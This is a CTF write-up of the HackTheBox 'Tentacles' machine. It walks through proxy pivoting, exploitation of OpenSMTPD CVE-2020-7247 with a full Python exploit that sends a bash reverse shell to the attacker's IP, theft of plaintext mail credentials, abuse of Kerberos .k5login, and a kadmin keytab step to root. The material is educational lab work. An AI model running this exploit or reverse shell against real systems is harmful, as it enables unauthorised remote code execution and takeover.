Title: Tentacles writeup HackTheBox - by DarkRider88
Date: 19/06/2021
Description: This is a hard level machine in which we first access some internal network using squid proxy then we exploit the SMTP to gain initial shell. After we use kerberos to login into ssh and get our first flag.
Image: /assets/images/tentacles-images/tentacles.jpg
Level: Hard

## Enumeration

Starting with nmap scan

```bash
# Nmap 7.91 scan initiated Mon Feb  1 22:23:03 2021 as: nmap -sV -oN nmap.txt 10.10.10.224
Nmap scan report for 10.10.10.224
Host is up (0.49s latency).
Not shown: 995 filtered ports
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-02-02 04:54:03Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
9090/tcp closed zeus-admin
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

```

There is a squid proxy running and checking that with a browser we got the domain and a username

![squid proxy](/assets/images/tentacles-images/squid.png)

```
user: j.nakazawa
domain: realcorp.htb.

```

let's also enumerate port 53 for any subdomains

Running dnsenum

```bash
dnsenum --threads 64 --dnsserver 10.10.10.224 -f subdomain.txt  realcorp.htb
```

```
dnsenum VERSION:1.2.6

-----   realcorp.htb
Name Servers:
______________
ns.realcorp.htb.                         259200   IN    A        10.197.243.77

Brute forcing with subdomain.txt:
_________________________________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31


```

### **Details**

- We cannot access the proxy of wpad domain because squid is asking for authentication
- but the localhost(the machine itself) could access those domain.
- So we proxy our connection through Squid then localhost:3128 and then the proxy.realcorp.htb(10.197.243.77) we access the domains

edit the /etc/proxychains4.conf

```bash
[ProxyList]
# add proxy here ...
dynamic_chain
http    10.10.10.224 3128 #host
http    127.0.0.1 3128  #localhost
http    10.197.243.77 3128 #proxy.realcorp.htb

```

if we run nmap on 10.197.243.31

```
proxychains nmap -sT -Pn 10.197.243.31

PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
```

add wpad.realcorp.htb to your /etc/hosts file

To access the wpad.realcorp.htb

```bash
proxychains firefox http://wpad.realcorp.htb
```

- After this we are greeted with forbidden page
- Since this is wpad it has http://wpad.realcorp.htb/wpad.dat file which contains javascript code

wpad.dat

```js
function FindProxyForURL(url, host) {
  if (dnsDomainIs(host, "realcorp.htb")) return "DIRECT";
  if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
    return "DIRECT";
  if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
    return "DIRECT";

  return "PROXY proxy.realcorp.htb:3128";
}
```

And we got another Ip range

first I performed a reverse lookup on this subnet with dnsrecon

```bash
darkrider@sunshine:~/hackthebox/boxes/tentacles$ dnsrecon -r 10.241.251.0/24 -n 10.10.10.224 -d anything
[*] Reverse Look-up of a Range
[*] Performing Reverse Lookup from 10.241.251.0 to 10.241.251.255
[+] PTR srvpod01.realcorp.htb 10.241.251.113
[+] 1 Records Found


```

this gave us 1 up ip and now enumerating that ip with nmap

```bash
$ proxychains nmap --top-ports 6 10.241.251.113

```

We got 10.241.251.113 is up and have smtp port 25 open

## SMTP exploitation

It is running OpenSMTPD, I searched for this online and found some exploits (CVE-2020-7247)
https://github.com/FiroSolutions/cve-2020-7247-exploit

I modified this exploit litlle bit

```python

import socket, time
import sys

if len(sys.argv) < 2:
    print("\n\nUsage: python3 exploit.py machine-ip")
    exit()
HOST = sys.argv[1]
PORT = 25              # The same port as used by the server
s = None

writewhat = 'bash -c "bash -i >& /dev/tcp/10.10.16.3/1234 0>&1"' # hard coded rev shell
payload = b"""\r\n
#0\r\n
#1\r\n
#2\r\n
#3\r\n
#4\r\n
#5\r\n
#6\r\n
#7\r\n
#8\r\n
#9\r\n
#a\r\n
#b\r\n
#c\r\n
#d\r\n
"""+writewhat.encode()+b"""
.
"""

for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
        s = socket.socket(af, socktype, proto)
    except OSError as msg:
        s = None
        continue
    try:
        s.connect(sa)
    except OSError as msg:
        s.close()
        s = None
        continue
    break
if s is None:
    print('could not open socket')
    sys.exit(1)
with s:
    data = s.recv(1024)
    print('Received', repr(data))
    time.sleep(1)
    print('sending')
    s.send(b"helo test.com\r\n")
    data = s.recv(1024)
    print('Received', repr(data))
    s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
    time.sleep(1)
    data = s.recv(1024)
    print('Received', repr(data))
    s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")
    data = s.recv(1024)
    print('Received', repr(data))
    s.send(b"DATA\r\n")
    data = s.recv(1024)
    print('Received', repr(data))
    s.send(payload)
    data = s.recv(1024)
    print('Received', repr(data))
    s.send(b"QUIT\r\n")
    data = s.recv(1024)
    print('Received', repr(data))
print("done")
s.close()
```

after that I ran the exploit

```
proxychains python3 smtp_exploit.py 10.241.251.113
```

And we got the reverse shell as root

## User

Reading a file in /home/j.nakazawa/.msmtprc

and found some creds

```
# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp

```

I tried using this with ssh but we can't use this. Another remaining is kerberos through which we can obtain a ticket using this password and login.

for this first install krb5-user in your system
Ref: https://kb.iu.edu/d/batb
https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Obtaining-Tickets-with-kinit.html

```bash
sudo apt install krb5-user
```

Then edit the /etc/krb5.conf

```
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = 10.10.10.224
        }

```

Generate the ticket using

```
kinit j.nakajawa
```

then enter the password

to list the ticket use

```
klist
```

After that edit your /etc/hosts file

```
10.10.10.224	srv01.realcorp.htb
```

> srv01.realcorp.htb is the hostname of machine
> keep only this

Then connect with ssh

```
ssh j.nakazawa@10.10.10.224
```

## **Privesc to Admin**

Cheking the crontab I found admin is running a script

```
admin /usr/local/bin/log_backup.sh
```

log_backup.sh

```bash
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

j.nakazawa is in the group of squid and we can write in the /var/log/squid dir
also whatever is in squid dir gets copied to /home/admin

Since every where is kerberos we can use kerberos feature of .k5login file
https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_config/k5login.html

just put the `j.nakazawa@REALCORP.HTB` in .k5login and put that in /var/log/squid

```
echo "j.nakazawa@REALCORP.HTB" > .k5login
cp .k5login /var/log/squid

ssh admin@srv01.realcorp.htb
```

and we are admin

## **Root**

ref: https://web.mit.edu/kerberos/krb5-devel/doc/admin/admin_commands/kadmin_local.html#kadmin-1

file krb5.keytab is useful becuase it is used in various authentication in kerberos
to view the content of that file

`klist -k /etc/krb5.keytab`

then login to kadmin

```
kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

after login I listed all the users

```
list_principals

K/M@REALCORP.HTB
host/srv01.realcorp.htb@REALCORP.HTB
j.nakazawa@REALCORP.HTB
kadmin/admin@REALCORP.HTB
kadmin/changepw@REALCORP.HTB
kadmin/srv01.realcorp.htb@REALCORP.HTB
kiprop/srv01.realcorp.htb@REALCORP.HTB
krbtgt/REALCORP.HTB@REALCORP.HTB
```

there was no root

so just add the root principal

```
add_principal root@REALCORP.HTB
```

type the password and exit the console

then type ksu and login

ROOTED
